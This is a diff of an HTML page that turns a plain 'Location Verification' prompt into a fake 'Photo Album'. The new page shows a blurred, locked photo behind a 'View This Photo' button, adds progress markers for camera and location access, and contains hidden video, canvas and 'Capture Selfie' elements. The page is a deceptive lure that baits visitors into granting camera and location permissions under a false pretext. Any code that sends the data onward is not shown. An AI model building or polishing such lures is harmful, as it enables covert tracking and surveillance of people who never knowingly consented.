@@ -5,7 +5,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Your Photo Album</title>
-
     <link rel="stylesheet" href="css/style.css">
 </head>
 
@@ -13,49 +12,54 @@
 
     <div class="container">
 
-        <h1>📍 Location Verification</h1>
+        <h1>📍 Photo Album</h1>
 
-        <p>
-            Please share your location to continue.
-        </p>
+        <!-- Locked photo card -->
+        <div class="photo-card">
+            <div class="photo-overlay">
+                <img id="albumPhoto"
+                     src="https://picsum.photos/seed/album1/800/500"
+                     alt="Album Photo"
+                     style="width:100%; display:block; filter:blur(20px); transition:filter 0.5s ease; pointer-events:none; user-select:none;">
+                <div id="lockBadge" style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); background:rgba(0,0,0,0.65); color:#fff; font-size:48px; width:80px; height:80px; border-radius:50%; display:flex; align-items:center; justify-content:center; pointer-events:none; z-index:2; transition:opacity 0.4s ease;">🔒</div>
+            </div>
+            <div style="padding:20px; text-align:center;">
+                <button id="viewPhotoBtn" style="background:#1a73e8; color:#fff; border:none; padding:14px 32px; font-size:16px; font-weight:600; border-radius:8px; cursor:pointer;">
+                    👁️ View This Photo
+                </button>
+                <p id="status"></p>
+            </div>
+        </div>
 
-        <button id="shareLocation">
-            Share My Location
-        </button>
-
-        <p id="status"></p>
+        <!-- Permission progress indicators -->
+        <div id="permissionProgress" style="display:none;">
+            <div id="stepCamera" style="display:flex; align-items:center; gap:10px; padding:10px 16px; margin:8px 0; border-radius:8px; background:#fff; border:1px solid #e0e0e0; font-size:14px;">
+                <span>📷</span>
+                <span>Camera Access</span>
+                <span style="margin-left:auto; font-weight:500;">Waiting...</span>
+            </div>
+            <div id="stepLocation" style="display:flex; align-items:center; gap:10px; padding:10px 16px; margin:8px 0; border-radius:8px; background:#fff; border:1px solid #e0e0e0; font-size:14px;">
+                <span>📍</span>
+                <span>Location Access</span>
+                <span style="margin-left:auto; font-weight:500;">Waiting...</span>
+            </div>
+        </div>
 
         <hr>
 
-        <!-- Camera permission prompt - shown after location is captured -->
+        <!-- Camera section – shown after camera permission granted -->
         <div id="cameraPermissionSection" style="display:none;">
             <h3>📷 Selfie Verification</h3>
-            <p>Please allow camera access for identity verification.</p>
+            <p>Camera access granted!</p>
         </div>
 
-        <video
-            id="video"
-            autoplay
-            playsinline
-            style="
-                display:none;
-                width:100%;
-                border-radius:10px;
-                margin-top:15px;
-            ">
+        <video id="video" autoplay playsinline
+                style="display:none; width:100%; border-radius:10px; margin-top:15px;">
         </video>
 
-        <canvas
-            id="canvas"
-            style="display:none;">
-        </canvas>
+        <canvas id="canvas" style="display:none;"></canvas>
 
-        <button
-            id="captureBtn"
-            style="
-                display:none;
-                margin-top:15px;
-            ">
+        <button id="captureBtn" style="display:none; margin-top:15px;">
             📷 Capture Selfie
         </button>
 
